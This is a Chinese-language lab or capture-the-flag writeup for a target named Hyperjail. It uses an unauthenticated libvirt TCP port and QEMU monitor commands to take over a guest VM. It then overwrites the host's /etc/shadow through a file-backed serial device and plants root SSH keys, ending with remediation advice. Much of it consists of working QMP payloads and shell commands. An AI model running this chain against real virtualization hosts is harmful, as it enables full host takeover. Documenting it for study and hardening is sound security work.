# Hyperjail Writeup

## 靶机信息

- **靶机名称**: Hyperjail
- **靶机 IP**: 192.168.56.107
- **操作系统**: Alpine Linux v3.23 (内核 6.18.32-0-lts)
- **目标**: 获取 root shell
- **初始凭据**: SSH 密钥登录 `operation` 用户 (端口 3389)

## 信息收集

### 初始登录与系统枚举

使用提供的 SSH 密钥登录靶机：

```bash
ssh -i ./kali_key operation@192.168.56.107 -p 3389
```

基本信息：

```
uid=1000(operation) gid=1000(operation) groups=1000(operation)
Linux Hyperjail 6.18.32-0-lts #1-Alpine SMP PREEMPT_DYNAMIC 2026-05-17 19:50:18 x86_64 Linux
```

`operation` 用户不在 `wheel` 组中，无法使用 `sudo` 或 `doas`。

### 家目录文件

```
-rw-r--r--    1 operation operation       165 Jul  8  2025 README.txt
-rw-r--r--    1 operation operation  67108864 Jul  4  2025 alpine-virt-3.22.0-x86_64.iso
-rwxr-xr-x    1 operation operation     29104 May  7 15:59 copy-fail...?
-rwxr-xr-x    1 operation operation   1062554 May 20 18:58 linpeas.sh
-rwxr-xr-x    1 operation operation   3104768 May 20 18:56 pspy64
```

README.txt 内容：

> If I discover again that you are using a virtual machine to transfer the host machine's configuration files, you will be fired. Clean up your services within today!

这条信息暗示了攻击路径与虚拟机相关。

### 虚拟化环境发现

系统上安装了完整的 QEMU/libvirt 虚拟化环境：

```bash
$ ps aux | grep qemu
2569 root  /usr/bin/qemu-system-x86_64 -name guest=kvm799 ...
```

一个名为 `kvm799` 的虚拟机正在以 root 权限运行。

### 网络拓扑

```
eth0:    192.168.56.107/24  (外部网络)
virbr0:  192.168.122.1/24   (libvirt 虚拟网桥)
```

虚拟机 IP 通过 ARP 表发现为 `192.168.122.76`。

### 关键发现：libvirt 配置

```bash
$ cat /etc/libvirt/libvirtd.conf | grep -v '^#' | grep -v '^$'
listen_tls = 0
listen_tcp = 1
tcp_port = "16509"
auth_tcp = "none"
```

**libvirt 守护进程在 TCP 16509 端口监听，且认证方式为 `none`（无认证）。** 这是整个攻击链的关键入口。

## 攻击过程

### 第一步：通过 libvirt TCP 获取虚拟机控制权

由于 libvirt TCP 端口无需认证，任何能访问该端口的用户都可以完全控制虚拟机：

```python
import libvirt
conn = libvirt.open('qemu+tcp://127.0.0.1:16509/system')
dom = conn.lookupByName('kvm799')
# Domain: kvm799, State: [1, 1] (running), ID: 1
```

通过 QMP (QEMU Monitor Protocol) 可以执行任意虚拟机管理命令。

### 第二步：获取虚拟机串口控制台

虚拟机的串口设备 (`charserial0`) 原本连接到宿主机的 PTY (`/dev/pts/0`)，我们无权访问。利用 QMP 的 `chardev-change` 命令，将串口重定向到一个 TCP socket：

```python
cmd = {
    'execute': 'chardev-change',
    'arguments': {
        'id': 'charserial0',
        'backend': {
            'type': 'socket',
            'data': {
                'addr': {'type': 'inet', 'data': {'host': '0.0.0.0', 'port': '4445'}},
                'server': True,
                'wait': False
            }
        }
    }
}
```

现在可以通过 `nc 127.0.0.1 4445` 访问虚拟机的串口控制台：

```
Welcome to Alpine Linux 3.22
Kernel 6.12.34-0-virt on x86_64 (/dev/ttyS0)
localhost login:
```

### 第三步：从 Alpine ISO 启动获取 VM root

虚拟机的 root 密码未知。利用 QMP 命令挂载家目录中的 Alpine ISO 并修改启动顺序：

```python
# 打开 CDROM 托盘
{'execute': 'blockdev-open-tray', 'arguments': {'id': 'sata0-0-0'}}

# 添加 ISO 块设备
{'execute': 'blockdev-add', 'arguments': {
    'driver': 'file',
    'filename': '/home/operation/alpine-virt-3.22.0-x86_64.iso',
    'node-name': 'iso-file',
    'read-only': True
}}
{'execute': 'blockdev-add', 'arguments': {
    'driver': 'raw', 'file': 'iso-file',
    'node-name': 'iso-raw', 'read-only': True
}}

# 插入介质并关闭托盘
{'execute': 'blockdev-insert-medium', 'arguments': {'id': 'sata0-0-0', 'node-name': 'iso-raw'}}
{'execute': 'blockdev-close-tray', 'arguments': {'id': 'sata0-0-0'}}

# 修改启动顺序，CDROM 优先
'qom-set /machine/peripheral/sata0-0-0 bootindex 0'
'qom-set /machine/peripheral/virtio-disk0 bootindex 2'

# 重启虚拟机
{'execute': 'system_reset'}
```

Alpine live ISO 默认以 root 身份登录且无需密码：

```
Welcome to Alpine Linux 3.22
Kernel 6.12.31-0-virt on x86_64 (/dev/ttyS0)  # 注意内核版本不同，确认从 ISO 启动
localhost login: root
localhost:~# id
uid=0(root) gid=0(root) groups=0(root)...
```

### 第四步：修改虚拟机磁盘上的 root 密码

在 live ISO 环境中挂载虚拟机的根文件系统并清除 root 密码：

```bash
mkdir -p /mnt/root
mount /dev/vda3 /mnt/root
sed -i 's/^root:[^:]*:/root::/' /mnt/root/etc/shadow
sync
umount /mnt/root
```

### 第五步：从硬盘重启虚拟机

弹出 CDROM 并重启，虚拟机从硬盘启动：

```python
# 弹出 ISO
{'execute': 'eject', 'arguments': {'id': 'sata0-0-0', 'force': True}}
# 重启
{'execute': 'system_reset'}
```

确认从硬盘启动（内核版本 6.12.34-0-virt），以 root 无密码登录成功。

### 第六步：利用 QEMU chardev 文件写入提权宿主机

这是整个攻击链中最关键的一步。QEMU 进程以 root 身份运行在宿主机上。QMP 的 `chardev-add` 命令支持 `file` 类型后端，可以将 chardev 的输出写入宿主机上的任意文件。配合 `device_add` 添加 virtio-serial 端口，虚拟机内部写入该端口的数据会直接写入宿主机的文件系统。

**原理：**

```
VM 内部 → /dev/vportXpY → virtio-serial → chardev (file backend) → 宿主机文件
```

**关键特性：** `chardev-add` 创建 file 类型后端时，QEMU 以 `O_WRONLY|O_CREAT|O_TRUNC` 模式打开文件，即会截断已有文件。这意味着每次创建新的 chardev 都会清空目标文件，然后从虚拟机写入的内容会成为文件的全部内容。

#### 6.1 创建指向 /etc/shadow 的 chardev

从 Kali 使用 `virsh` 发送 QMP 命令（因为 Kali 上安装了 libvirt-clients）：

```bash
# 创建 file 类型 chardev，目标为宿主机的 /etc/shadow（会截断文件）
virsh -c qemu+tcp://192.168.56.107:16509/system qemu-monitor-command kvm799 \
  '{"execute":"chardev-add","arguments":{"id":"sw4","backend":{"type":"file","data":{"out":"/etc/shadow"}}}}'

# 添加 virtio-serial 端口连接到该 chardev
virsh -c qemu+tcp://192.168.56.107:16509/system qemu-monitor-command kvm799 \
  '{"execute":"device_add","arguments":{"driver":"virtserialport","bus":"virtio-serial0.0","chardev":"sw4","id":"sp4","name":"sw4"}}'
```

#### 6.2 从虚拟机内部写入新的 shadow 文件

在虚拟机中，新的 virtio-serial 端口出现为 `/dev/vport1p2`：

```bash
# 生成包含已知密码哈希的 shadow 文件
# 密码 'toor' 的 SHA-512 哈希
echo 'cm9vdDokNiR4eXokQkRt...' | base64 -d > /tmp/shadow_clean

# 写入宿主机的 /etc/shadow
cat /tmp/shadow_clean > /dev/vport1p2
```

写入的 shadow 文件内容：

```
root:$6$xyz$BDmP0jwgcE7rJupmgiDusNIop8zGY0BnFJCoLJUX/YXp6ldB7vwCcrfg/BFvDORz3JL0GmjzQkzUXWUlN9Ebq/:20277:0:::::
bin:!::0:::::
...
operation:*:20273:0:99999:7:::
...
```

注意 `operation` 用户的密码字段设为 `*`（非 `!`），确保 SSH 公钥认证仍然有效。

### 第七步：获取 Root Shell

```bash
# 以 operation 用户登录后 su 到 root
$ ssh -i ./kali_key operation@192.168.56.107 -p 3389
$ echo 'toor' | su -c 'id' root
uid=0(root) gid=0(root) groups=0(root)...
```

设置 SSH 密钥实现直接 root 登录：

```bash
echo 'toor' | su -c 'mkdir -p /root/.ssh && cat /home/operation/.ssh/authorized_keys > /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys' root
```

最终验证：

```bash
$ ssh -i ./kali_key root@192.168.56.107 -p 3389
# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
# hostname
Hyperjail
```

## Flag

```bash
# cat /root/H3r315TRUEFl@g.txt
hvm{ae1edcc0-23c8-4d3d-909a-b533524c8049}
```

## 攻击链总结

```
┌─────────────────────────────────────────────────────────────────┐
│  Kali (攻击机)                                                    │
│  192.168.56.104                                                  │
└──────────┬──────────────────────────────────────────────────────┘
           │ SSH (port 3389, key auth)
           ▼
┌─────────────────────────────────────────────────────────────────┐
│  Hyperjail 宿主机 (目标)                                          │
│  192.168.56.107                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ operation 用户 (低权限)                                     │  │
│  │   → 发现 libvirt TCP:16509 无认证                           │  │
│  │   → 通过 QMP 控制 QEMU 虚拟机                               │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ QEMU 进程 (root 权限运行)                                   │  │
│  │   → chardev file backend 写入宿主机 /etc/shadow             │  │
│  │   → virtio-serial 端口连接 VM 与宿主机文件                    │  │
│  └──────────┬────────────────────────────────────────────────┘  │
│             │ virtio-serial                                       │
│             ▼                                                     │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │ kvm799 虚拟机 (Alpine Linux 3.22)                           │  │
│  │  192.168.122.76                                             │  │
│  │   → 通过 ISO 启动获取 root                                   │  │
│  │   → 向 /dev/vport1p2 写入数据                                │  │
│  │   → 数据直接写入宿主机 /etc/shadow                            │  │
│  └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│  最终: su root (密码 toor) → ROOT SHELL                          │
└─────────────────────────────────────────────────────────────────┘
```

## 漏洞分析

### 根本原因

1. **libvirt TCP 无认证暴露 (Critical)**: `/etc/libvirt/libvirtd.conf` 配置了 `auth_tcp = "none"`，允许任何本地用户无需认证即可完全控制虚拟化平台。这意味着低权限用户可以执行任意 QMP 命令。

2. **QEMU chardev file backend 任意文件写入**: QEMU 以 root 身份运行，其 QMP 接口的 `chardev-add` 命令支持 `file` 类型后端，可以创建指向宿主机任意路径的文件。配合 virtio-serial 设备，虚拟机内部可以向该文件写入任意内容。虽然 QEMU 启用了 sandbox (`-sandbox on`)，但 sandbox 的 `elevateprivileges=deny` 仅阻止提升权限（如 setuid），并不阻止以当前权限（root）写入文件。

### 修复建议

1. **启用 libvirt 认证**: 将 `auth_tcp` 设置为 `sasl` 或完全禁用 TCP 监听，仅使用 Unix socket 配合 polkit 进行访问控制。
2. **限制 libvirt 访问**: 通过防火墙规则限制 16509 端口的访问，或将 libvirt socket 的权限限制为特定用户组。
3. **QEMU 安全加固**: 使用 SELinux/AppArmor 的 sVirt 策略限制 QEMU 进程的文件系统访问范围。
4. **最小权限原则**: 考虑使用非 root 用户运行 QEMU 进程，并通过 cgroups 限制其资源访问。

## 技术要点

- **QMP (QEMU Monitor Protocol)**: QEMU 的管理接口，支持通过 JSON 格式的命令控制虚拟机的各个方面，包括设备热插拔、块设备管理、字符设备管理等。
- **chardev-add (file backend)**: 创建文件时使用 `O_TRUNC` 标志，每次创建新 chardev 会截断目标文件。这个特性被利用来精确控制写入宿主机文件的内容。
- **virtio-serial**: 一种高性能的虚拟机与宿主机之间的通信通道。通过在虚拟机内部写入对应的字符设备（`/dev/vportXpY`），数据会传递到宿主机端的 chardev 后端。
- **Alpine Linux shadow 文件**: 密码字段为空（`root::`）表示无密码，`*` 表示账户禁用密码登录但允许其他认证方式（如 SSH 公钥），`!` 表示账户完全锁定。 
